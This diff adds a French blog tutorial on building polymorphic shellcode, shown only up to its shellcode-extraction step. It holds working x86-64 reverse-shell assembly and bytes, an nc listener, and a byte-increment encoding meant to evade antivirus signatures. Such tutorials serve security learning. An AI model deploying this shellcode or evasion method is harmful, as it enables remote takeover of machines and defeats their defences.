@@ -1,0 +1,516 @@
+<!DOCTYPE html>
+<html lang="fr">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>Shellcode Polymorphique - Nyxott&#39;s blog</title><meta name="Description" content="Créer un shellcode polymorphique"><meta property="og:title" content="Shellcode Polymorphique" />
+<meta property="og:description" content="Créer un shellcode polymorphique" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://nyxott.github.io/posts/shellcode-polymorphique/" />
+<meta property="og:image" content="https://nyxott.github.io/posts/shellcode-polymorphique/featured-image.png"/>
+<meta property="article:published_time" content="2020-07-01T00:00:00+00:00" />
+<meta property="article:modified_time" content="2020-07-01T00:00:00+00:00" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://nyxott.github.io/posts/shellcode-polymorphique/featured-image.png"/>
+<meta name="twitter:title" content="Shellcode Polymorphique"/>
+<meta name="twitter:description" content="Créer un shellcode polymorphique"/>
+<meta name="application-name" content="Nyxott&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="Nyxott&#39;s blog"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://nyxott.github.io/posts/shellcode-polymorphique/" /><link rel="prev" href="https://nyxott.github.io/posts/asm/" /><link rel="next" href="https://nyxott.github.io/posts/coffre-fort-numerique-distant/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Shellcode Polymorphique",
+        "inLanguage": "fr",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/nyxott.github.io\/posts\/shellcode-polymorphique\/"
+        },"image": [{
+                            "@type": "ImageObject",
+                            "url": "https:\/\/nyxott.github.io\/posts\/shellcode-polymorphique\/featured-image.png",
+                            "width":  1600 ,
+                            "height":  720 
+                        }],"genre": "posts","keywords": "Projects","wordcount":  3476 ,
+        "url": "https:\/\/nyxott.github.io\/posts\/shellcode-polymorphique\/","datePublished": "2020-07-01T00:00:00+00:00","dateModified": "2020-07-01T00:00:00+00:00","publisher": {
+            "@type": "Organization",
+            "name": "Nyxott"},"author": {
+                "@type": "Person",
+                "name": "Nyxott"
+            },"description": "Créer un shellcode polymorphique"
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Nyxott&#39;s blog"><span class="header-title-pre"><i class='fas fa-dollar-sign'></i></span><span id="id-1" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"><i class='fas fa-file-alt'></i> Posts </a><a class="menu-item" href="/categories/"><i class='fa fa-folder-open'></i> Categories </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Nyxott&#39;s blog"><span class="header-title-pre"><i class='fas fa-dollar-sign'></i></span><span id="id-2" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title=""><i class='fas fa-file-alt'></i>Posts</a><a class="menu-item" href="/categories/" title=""><i class='fa fa-folder-open'></i>Categories</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">Shellcode Polymorphique</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Nyxott</a></span>&nbsp;<span class="post-category">included in <a href="/categories/projects/"><i class="far fa-folder fa-fw"></i>Projects</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="01-07-2020">01-07-2020</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;3476 words&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;17 minutes&nbsp;</div>
+        </div><div class="featured-image"><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/shellcode-polymorphique/featured-image.png"
+        data-srcset="/posts/shellcode-polymorphique/featured-image.png, /posts/shellcode-polymorphique/featured-image.png 1.5x, /posts/shellcode-polymorphique/featured-image.png 2x"
+        data-sizes="auto"
+        alt="/posts/shellcode-polymorphique/featured-image.png"
+        title="Créer un shellcode polymorphique" /></div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#définitions-et-explications">Définitions et explications</a></li>
+    <li><a href="#notions-dassembleur">Notions d&rsquo;assembleur</a></li>
+    <li><a href="#projet">Projet</a>
+      <ul>
+        <li><a href="#reverse-shell">Reverse shell</a></li>
+        <li><a href="#chiffrement-du-shellcode">Chiffrement du shellcode</a></li>
+        <li><a href="#déchiffrement-du-shellcode">Déchiffrement du shellcode</a></li>
+        <li><a href="#exécution-du-shellcode">Exécution du shellcode</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>Cet article explique comment créer un shellcode polymorphique permettant d&rsquo;obtenir un reverse shell.</p>
+<h2 id="définitions-et-explications">Définitions et explications</h2>
+<p>Un shellcode est une suite de caractères hexadécimaux représentant un binaire.</p>
+<p>Voici par exemple un shellcode permettant d&rsquo;effectuer la commande <code>execve(&quot;/bin/sh&quot;);</code> sur un Linux 64 bits :</p>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="ln">1</span><span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>d2<span class="se">\x</span>48<span class="se">\x</span>bb<span class="se">\x</span>2f<span class="se">\x</span>2f<span class="se">\x</span>62<span class="se">\x</span>69<span class="se">\x</span>6e<span class="se">\x</span>2f<span class="se">\x</span>73<span class="se">\x</span>68<span class="se">\x</span>48<span class="se">\x</span>c1<span class="se">\x</span>eb<span class="se">\x</span>08<span class="se">\x</span>53<span class="se">\x</span>48<span class="se">\x</span>89<span class="se">\x</span>e7<span class="se">\x</span>50<span class="se">\x</span>57<span class="se">\x</span>48<span class="se">\x</span>89<span class="se">\x</span>e6<span class="se">\x</span>b0<span class="se">\x</span>3b<span class="se">\x</span>0f<span class="se">\x</span><span class="m">05</span>
+</code></pre></div><p>Ce shellcode a été tiré du site <a href="http://shell-storm.org/shellcode/" target="_blank" rel="noopener noreffer">http://shell-storm.org/shellcode/</a> où se trouve de nombreux shellcodes pour tous types d&rsquo;architectures.</p>
+<p>Un shellcode peut être utilisé durant l&rsquo;exploitation d&rsquo;un buffer overflow.</p>
+<p>Dans un programme écrit en C, par exemple, des buffers peuvent être utilisés afin de stocker en RAM des informations de manière temporaire. Si les entrées utilisateur à destination de ces buffers ne sont pas correctement gérées et/ou que des fonctions obsolètes sont utilisées, alors il est possible de remplir le buffer puis d&rsquo;en sortir pour écrire sur la RAM. C&rsquo;est un buffer overflow.</p>
+<p>Pour reprendre l&rsquo;exemple du shellcode ci-dessus, il serait possible d&rsquo;effectuer un buffer overflow et d&rsquo;utiliser ce shellcode pour obtenir un shell sur le serveur.</p>
+<p>Néanmoins, les antivirus détectent certains patterns tels que, par exemple, la chaîne de caractères <code>/bin/sh</code> représenté en hexadécimale par <code>\x2f\x62\x69\x6e\x2f\x73\x68</code>. En effet, l&rsquo;on peut remarquer que ce pattern est bien présent dans le shellcode ci-dessus. Ainsi, les antivirus peuvent empêcher son exécution et par conséquent le succès de l&rsquo;exploitation d&rsquo;un buffer overflow.</p>
+<p>C&rsquo;est pourquoi des shellcodes dit polymorphiques ont vu le jour.</p>
+<p>Le terme polymorphique indique simplement que le shellcode sera chiffré et qu&rsquo;un décodeur y sera ajouté.</p>
+<p>Pour illustrer cela de manière extrêmement simple, nous allons reprendre le shellcode du début :</p>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="ln">1</span><span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>d2<span class="se">\x</span>48<span class="se">\x</span>bb<span class="se">\x</span>2f<span class="se">\x</span>2f<span class="se">\x</span>62<span class="se">\x</span>69<span class="se">\x</span>6e<span class="se">\x</span>2f<span class="se">\x</span>73<span class="se">\x</span>68<span class="se">\x</span>48<span class="se">\x</span>c1<span class="se">\x</span>eb<span class="se">\x</span>08<span class="se">\x</span>53<span class="se">\x</span>48<span class="se">\x</span>89<span class="se">\x</span>e7<span class="se">\x</span>50<span class="se">\x</span>57<span class="se">\x</span>48<span class="se">\x</span>89<span class="se">\x</span>e6<span class="se">\x</span>b0<span class="se">\x</span>3b<span class="se">\x</span>0f<span class="se">\x</span><span class="m">05</span>
+</code></pre></div><p>Nous le chiffrons en incrémentant chaque valeur hexadécimale :</p>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="ln">1</span><span class="se">\x</span>49<span class="se">\x</span>32<span class="se">\x</span>d3<span class="se">\x</span>49<span class="se">\x</span>bc<span class="se">\x</span>30<span class="se">\x</span>30<span class="se">\x</span>63<span class="se">\x</span>6a<span class="se">\x</span>6f<span class="se">\x</span>30<span class="se">\x</span>74<span class="se">\x</span>69<span class="se">\x</span>49<span class="se">\x</span>c2<span class="se">\x</span>ec<span class="se">\x</span>09<span class="se">\x</span>54<span class="se">\x</span>49<span class="se">\x</span>8a<span class="se">\x</span>e8<span class="se">\x</span>51<span class="se">\x</span>58<span class="se">\x</span>49<span class="se">\x</span>8a<span class="se">\x</span>e7<span class="se">\x</span>b1<span class="se">\x</span>3c<span class="se">\x</span>10<span class="se">\x</span><span class="m">06</span>
+</code></pre></div><p>Notre shellcode est désormais chiffré puisque nous avons ajouté 0x01 à chaque valeur hexadécimale. Nous pouvons alors remarquer que le pattern <code>\x2f\x62\x69\x6e\x2f\x73\x68</code> n&rsquo;est plus présent.</p>
+<div class="details admonition warning open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-exclamation-triangle fa-fw"></i>Warning<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">Il est important de préciser ici que certaines valeurs hexadécimales sont à proscrire. Ce sont les badchars. Ils peuvent varier, mais la plupart du temps ce sont <code>\x00</code> et <code>\x0a</code> qui doivent être évités puisque le premier représente un null byte (indiquant une fin de chaîne de caractères) et le second un saut de ligne. Ils créent des comportements inattendu et empêche la bonne exécution du shellcode. Il faut donc veiller à ce que ces valeurs ne soient présentes nulle part.</div>
+        </div>
+    </div>
+<p>Notre shellcode étant désormais chiffré, il n&rsquo;est plus exécutable et il est donc nécessaire d&rsquo;y ajouter un décodeur.</p>
+<p>Ici, c&rsquo;est un exemple donc je ne vais pas montrer le shellcode permettant de décoder ce shellcode chiffré, mais le shellcode final aura la forme suivante :</p>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="ln">1</span>&lt;shellcodeDecodeur&gt;<span class="se">\x</span>49<span class="se">\x</span>32<span class="se">\x</span>d3<span class="se">\x</span>49<span class="se">\x</span>bc<span class="se">\x</span>30<span class="se">\x</span>30<span class="se">\x</span>63<span class="se">\x</span>6a<span class="se">\x</span>6f<span class="se">\x</span>30<span class="se">\x</span>74<span class="se">\x</span>69<span class="se">\x</span>49<span class="se">\x</span>c2<span class="se">\x</span>ec<span class="se">\x</span>09<span class="se">\x</span>54<span class="se">\x</span>49<span class="se">\x</span>8a<span class="se">\x</span>e8<span class="se">\x</span>51<span class="se">\x</span>58<span class="se">\x</span>49<span class="se">\x</span>8a<span class="se">\x</span>e7<span class="se">\x</span>b1<span class="se">\x</span>3c<span class="se">\x</span>10<span class="se">\x</span><span class="m">06</span>
+</code></pre></div><p>Le shellcode final sera donc constitué d&rsquo;un shellcode décodeur suivi du shellcode chiffré. Ainsi, les antivirus ne pourront pas détecter de pattern spécifique avant l&rsquo;exécution de ce shellcode et lors de son exécution, ce dernier se déchiffrera automatiquement puis s&rsquo;exécutera.</p>
+<h2 id="notions-dassembleur">Notions d&rsquo;assembleur</h2>
+<div class="details admonition tip open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-lightbulb fa-fw"></i>Tip<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">Quelques notions d&rsquo;assembleur sont indéniablement nécessaires afin de faciliter la compréhension de la suite de ce post. Je vous invite donc à lire mon post <a href="https://nyxott.github.io/posts/asm" target="_blank" rel="noopener noreffer">L&rsquo;assembleur</a> avant de continuer celui-ci.</div>
+        </div>
+    </div>
+<h2 id="projet">Projet</h2>
+<p>Nous allons donc voir comment faire un shellcode polymorphique.</p>
+<h3 id="reverse-shell">Reverse shell</h3>
+<p>Tout d&rsquo;abord, il nous faut un shellcode initial. Un reverse shell est un bon choix puisque cela signifie que nous aurons un accès shell à la machine distante depuis notre machine.</p>
+<p>Voici donc le code assembleur de notre reverse shell :</p>
+<div class="highlight"><pre class="chroma"><code class="language-nasm" data-lang="nasm"><span class="ln"> 1</span><span class="k">section</span> <span class="nv">.text</span>
+<span class="ln"> 2</span>    <span class="k">global</span> <span class="nv">_start</span>
+<span class="ln"> 3</span>
+<span class="ln"> 4</span><span class="nl">_start:</span>
+<span class="ln"> 5</span>
+<span class="ln"> 6</span>    <span class="nl">initStructure:</span>
+<span class="ln"> 7</span>        <span class="nf">push</span> <span class="mh">0x640a017f</span>             <span class="c1">;put on the stack &#34;127.1.10.100&#34; in little endian</span>
+<span class="ln"> 8</span>        <span class="nf">push</span> <span class="kt">word</span> <span class="mh">0x697a</span>            <span class="c1">;put on the stack &#34;31337&#34; in little endian</span>
+<span class="ln"> 9</span>        <span class="nf">push</span> <span class="kt">word</span> <span class="mh">0x02</span>              <span class="c1">;put on the stack the communication area (here &#34;AF_INET&#34;)</span>
+<span class="ln">10</span>
+<span class="ln">11</span>    <span class="nl">socket:</span>
+<span class="ln">12</span>        <span class="nf">xor</span> <span class="nb">rdx</span><span class="p">,</span> <span class="nb">rdx</span>                <span class="c1">;indicate the protocol to be used (here the default protocol)</span>
+<span class="ln">13</span>        <span class="nf">xor</span> <span class="nb">rsi</span><span class="p">,</span> <span class="nb">rsi</span>                <span class="c1">;set to 0 the register used to store the semantics</span>
+<span class="ln">14</span>        <span class="nf">mov</span> <span class="nb">si</span><span class="nv">l</span><span class="p">,</span> <span class="mh">0x01</span>               <span class="c1">;indicate the semantics to be used (here &#34;SOCK_STREAM&#34;)</span>
+<span class="ln">15</span>        <span class="nf">xor</span> <span class="nb">rdi</span><span class="p">,</span> <span class="nb">rdi</span>                <span class="c1">;set to 0 the register used to store the communication area</span>
+<span class="ln">16</span>        <span class="nf">mov</span> <span class="nb">di</span><span class="nv">l</span><span class="p">,</span> <span class="mh">0x02</span>               <span class="c1">;indicate the communication area (here &#34;AF_INET&#34;)</span>
+<span class="ln">17</span>        <span class="nf">xor</span> <span class="nb">rax</span><span class="p">,</span> <span class="nb">rax</span>                <span class="c1">;set to 0 the register used to store the number syscall</span>
+<span class="ln">18</span>        <span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mh">0x29</span>                <span class="c1">;indicate the number for the socket syscall (41)</span>
+<span class="ln">19</span>        <span class="nf">syscall</span>
+<span class="ln">20</span>
+<span class="ln">21</span>    <span class="nl">connect:</span>
+<span class="ln">22</span>        <span class="nf">xor</span> <span class="nb">rdx</span><span class="p">,</span> <span class="nb">rdx</span>                <span class="c1">;set to 0 the register used to store the size of the target host address</span>
+<span class="ln">23</span>        <span class="nf">mov</span> <span class="nb">dl</span><span class="p">,</span> <span class="mh">0x11</span>                <span class="c1">;indicate the size of the target host address (here 127.1.10.100:31337 = 18 - 1 = 17)</span>
+<span class="ln">24</span>        <span class="nf">lea</span> <span class="nb">rsi</span><span class="p">,</span> <span class="p">[</span><span class="nb">rsp</span><span class="p">]</span>              <span class="c1">;indicate the target address (here &#34;127.1.10.100:31337&#34;) </span>
+<span class="ln">25</span>        <span class="nf">mov</span> <span class="nb">rdi</span><span class="p">,</span> <span class="nb">rax</span>                <span class="c1">;indicate the previously created socket</span>
+<span class="ln">26</span>        <span class="nf">xor</span> <span class="nb">rax</span><span class="p">,</span> <span class="nb">rax</span>                <span class="c1">;set to 0 the register used to store the number syscall</span>
+<span class="ln">27</span>        <span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mh">0x2a</span>                <span class="c1">;indicate the number for the connect syscall (42)</span>
+<span class="ln">28</span>        <span class="nf">syscall</span>
+<span class="ln">29</span>
+<span class="ln">30</span>    <span class="nl">redirection:</span>
+<span class="ln">31</span>        <span class="nf">xor</span> <span class="nb">rsi</span><span class="p">,</span> <span class="nb">rsi</span>                <span class="c1">;set to 0 the register used to store the file descriptor</span>
+<span class="ln">32</span>        <span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mh">0x21</span>                <span class="c1">;indicate the number for the dup2 syscall</span>
+<span class="ln">33</span>        <span class="nf">syscall</span>
+<span class="ln">34</span>        <span class="nf">inc</span> <span class="nb">si</span><span class="nv">l</span>                     <span class="c1">;increment by 1 the register used to store the file descriptor</span>
+<span class="ln">35</span>        <span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mh">0x21</span>                <span class="c1">;indicate the number for the dup2 syscall</span>
+<span class="ln">36</span>        <span class="nf">syscall</span>
+<span class="ln">37</span>        <span class="nf">inc</span> <span class="nb">si</span><span class="nv">l</span>                     <span class="c1">;increment by 1 the register used to store the file descriptor</span>
+<span class="ln">38</span>        <span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mh">0x21</span>                <span class="c1">;indicate the number for the dup2 syscall</span>
+<span class="ln">39</span>        <span class="nf">syscall</span>
+<span class="ln">40</span>
+<span class="ln">41</span>    <span class="nl">execShell:</span>
+<span class="ln">42</span>        <span class="nf">mov</span> <span class="nb">rdi</span><span class="p">,</span> <span class="mh">0x68732f6e69622f2f</span> <span class="c1">;&#34;//bin/sh&#34; in little endian</span>
+<span class="ln">43</span>        <span class="nf">xor</span> <span class="nb">rsi</span><span class="p">,</span> <span class="nb">rsi</span>                <span class="c1">;indicate the arguments (here there are no arguments)</span>
+<span class="ln">44</span>        <span class="nf">push</span> <span class="nb">rsi</span>                    <span class="c1">;put on the stack null byte</span>
+<span class="ln">45</span>        <span class="nf">push</span> <span class="nb">rdi</span>                    <span class="c1">;put on the stack &#34;//bin/sh&#34;</span>
+<span class="ln">46</span>        <span class="nf">xor</span> <span class="nb">rdx</span><span class="p">,</span> <span class="nb">rdx</span>                <span class="c1">;indicate the environment (here there is no environment)</span>
+<span class="ln">47</span>        <span class="nf">lea</span> <span class="nb">rdi</span><span class="p">,</span> <span class="p">[</span><span class="nb">rsp</span><span class="p">]</span>              <span class="c1">;indicate the path (here &#34;//bin/sh&#34;)</span>
+<span class="ln">48</span>        <span class="nf">xor</span> <span class="nb">rax</span><span class="p">,</span> <span class="nb">rax</span>                <span class="c1">;set to 0 the register use to store the syscall number</span>
+<span class="ln">49</span>        <span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mh">0x3b</span>                <span class="c1">;indicate the number for the execve syscall</span>
+<span class="ln">50</span>        <span class="nf">syscall</span>
+</code></pre></div><p>Dans un premier temps nous définissons la fonction <code>initStructure</code> qui va mettre sur la stack l&rsquo;adresse IP de la cible, son port ainsi que la famille à utiliser (ici IP).</p>
+<p>Viens ensuite la fonction <code>socket</code> qui crée un socket sur notre machine.</p>
+<p>Ce bout de code est équivalent au code C suivant :</p>
+<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="ln">1</span><span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</code></pre></div><p>Puis, viens la fonction <code>connect</code> qui va donc connecter notre socket à la machine cible via les informations misent sur la stack auparavant.</p>
+<p>Ce bout de code est équivalent au code C suivant :</p>
+<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="ln">1</span><span class="c1">// socketDescriptor contient le file descriptor du socket créé précédemment (résultat retourner par la fonction &#34;socket&#34;)
+</span><span class="ln">2</span><span class="c1">// serv_addr corresponds à la structure contenant l&#39;IP et le port de la cible
+</span><span class="ln">3</span><span class="c1"></span><span class="n">connect</span><span class="p">(</span><span class="n">socketDescriptor</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">serv_addr</span><span class="p">,</span> <span class="mi">17</span><span class="p">)</span>
+</code></pre></div><p>La fonction <code>redirection</code> permet de rediriger les flux de notre socket vers <code>stdin</code>, <code>stdout</code> et <code>stderr</code>.</p>
+<p>Ce bout de code est équivalent au code C suivant :</p>
+<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="ln">1</span><span class="c1">// socketDescriptor contient le file descriptor du socket créé précédemment (résultat retourner par la fonction &#34;socket&#34;)
+</span><span class="ln">2</span><span class="c1"></span><span class="n">dup2</span><span class="p">(</span><span class="n">socketDescriptor</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span> <span class="c1">// O corresponds à l&#39;entrée standard &#34;stdin&#34;
+</span><span class="ln">3</span><span class="c1"></span><span class="n">dup2</span><span class="p">(</span><span class="n">socketDescriptor</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span> <span class="c1">// 1 corresponds à la sortie standard &#34;stdout&#34;
+</span><span class="ln">4</span><span class="c1"></span><span class="n">dup2</span><span class="p">(</span><span class="n">socketDescriptor</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span> <span class="c1">// 2 corresponds à la sortie d&#39;erreur standard &#34;stderr&#34;
+</span></code></pre></div><p>Enfin, la fonction <code>execShell</code> exécute un shell qui sera lancé sur notre cible via le socket.</p>
+<p>Ce bout de code est équivalent au code C suivant :</p>
+<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="ln">1</span><span class="n">execve</span><span class="p">(</span><span class="s">&#34;//bin/sh&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</code></pre></div><p>Nous pouvons ensuite compiler notre code :</p>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="ln">1</span>nasm -f elf64 reverseShell.asm
+<span class="ln">2</span>ld reverseShell.o -o reverseShell
+</code></pre></div><p>Nous devons ouvrir un port sur notre machine à l&rsquo;adresse que nous avons indiquée dans notre programme :</p>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="ln">1</span>nc -l 127.1.10.100 <span class="m">31337</span> -v
+</code></pre></div><p>Puis, nous exécutons notre programme :</p>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="ln">1</span>./reverseShell
+</code></pre></div><p>Nous obtenons alors une connexion entrante sur notre port et nous pouvons exécuter les mêmes commandes que dans un shell.</p>
+<p>Maintenant que nous avons vérifié que notre programme fonctionne correctement nous pouvons récupérer le shellcode correspondant :</p>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="ln">1</span>objcopy --remove-section .note.gnu.property reverseShell <span class="o">(</span>cette commande supprime une section du programme qui ne nous est pas utile et qui génère des badchars<span class="o">)</span>
+<span class="ln">2</span><span class="k">for</span> i in <span class="sb">`</span>objdump -D reverseShell <span class="p">|</span> tr <span class="s1">&#39;\t&#39;</span> <span class="s1">&#39; &#39;</span> <span class="p">|</span> tr <span class="s1">&#39; &#39;</span> <span class="s1">&#39;\n&#39;</span> <span class="p">|</span> egrep <span class="s1">&#39;^[0-9a-f]{2}$&#39;</span> <span class="sb">`</span> <span class="p">;</span> <span class="k">do</span> <span class="nb">echo</span> -n <span class="s2">&#34;\x</span><span class="nv">$i</span><span class="s2">&#34;</span> <span class="p">;</span> <span class="k">done</span> <span class="p">;</span> <span class="nb">echo</span>
+</code></pre></div><p>Le résultat nous indique :</p>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="ln">1</span><span class="se">\x</span>68<span class="se">\x</span>7f<span class="se">\x</span>01<span class="se">\x</span>0a<span class="se">\x</span>64<span class="se">\x</span>66<span class="se">\x</span>68<span class="se">\x</span>7a<span class="se">\x</span>69<span class="se">\x</span>66<span class="se">\x</span>6a<span class="se">\x</span>02<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>d2<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>f6<span class="se">\x</span>40<span class="se">\x</span>b6<span class="se">\x</span>01<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>ff<span class="se">\x</span>40<span class="se">\x</span>b7<span class="se">\x</span>02<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>c0<span class="se">\x</span>b0<span class="se">\x</span>29<span class="se">\x</span>0f<span class="se">\x</span>05<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>d2<span class="se">\x</span>b2<span class="se">\x</span>11<span class="se">\x</span>48<span class="se">\x</span>8d<span class="se">\x</span>34<span class="se">\x</span>24<span class="se">\x</span>48<span class="se">\x</span>89<span class="se">\x</span>c7<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>c0<span class="se">\x</span>b0<span class="se">\x</span>2a<span class="se">\x</span>0f<span class="se">\x</span>05<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>f6<span class="se">\x</span>b0<span class="se">\x</span>21<span class="se">\x</span>0f<span class="se">\x</span>05<span class="se">\x</span>40<span class="se">\x</span>fe<span class="se">\x</span>c6<span class="se">\x</span>b0<span class="se">\x</span>21<span class="se">\x</span>0f<span class="se">\x</span>05<span class="se">\x</span>40<span class="se">\x</span>fe<span class="se">\x</span>c6<span class="se">\x</span>b0<span class="se">\x</span>21<span class="se">\x</span>0f<span class="se">\x</span>05<span class="se">\x</span>48<span class="se">\x</span>bf<span class="se">\x</span>2f<span class="se">\x</span>2f<span class="se">\x</span>62<span class="se">\x</span>69<span class="se">\x</span>6e<span class="se">\x</span>2f<span class="se">\x</span>73<span class="se">\x</span>68<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>f6<span class="se">\x</span>56<span class="se">\x</span>57<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>d2<span class="se">\x</span>48<span class="se">\x</span>8d<span class="se">\x</span>3c<span class="se">\x</span>24<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>c0<span class="se">\x</span>b0<span class="se">\x</span>3b<span class="se">\x</span>0f<span class="se">\x</span><span class="m">05</span>
+</code></pre></div><p>Si le résultat vous indique :</p>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="ln">1</span>h
+<span class="ln">2</span>dfhzifjH1�H1�@�H1�@�H1��<span class="o">)</span>H1ҲH�4<span class="nv">$H</span>��H1��*H1��!@�ư!@�ư!H�//bin/shH1�VWH1�H�&lt;<span class="nv">$H1</span>��<span class="p">;</span>
+</code></pre></div><p>C&rsquo;est que votre shell interprète l&rsquo;hexadécimal. Cela peut arriver si votre shell est <code>zsh</code> par exemple.</p>
+<p>Dans ce cas ouvrez un shell bash puis ré-exécuté la commande :</p>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="ln">1</span>/bin/bash
+<span class="ln">2</span><span class="k">for</span> i in <span class="sb">`</span>objdump -D reverseShell <span class="p">|</span> tr <span class="s1">&#39;\t&#39;</span> <span class="s1">&#39; &#39;</span> <span class="p">|</span> tr <span class="s1">&#39; &#39;</span> <span class="s1">&#39;\n&#39;</span> <span class="p">|</span> egrep <span class="s1">&#39;^[0-9a-f]{2}$&#39;</span> <span class="sb">`</span> <span class="p">;</span> <span class="k">do</span> <span class="nb">echo</span> -n <span class="s2">&#34;\x</span><span class="nv">$i</span><span class="s2">&#34;</span> <span class="p">;</span> <span class="k">done</span> <span class="p">;</span> <span class="nb">echo</span>
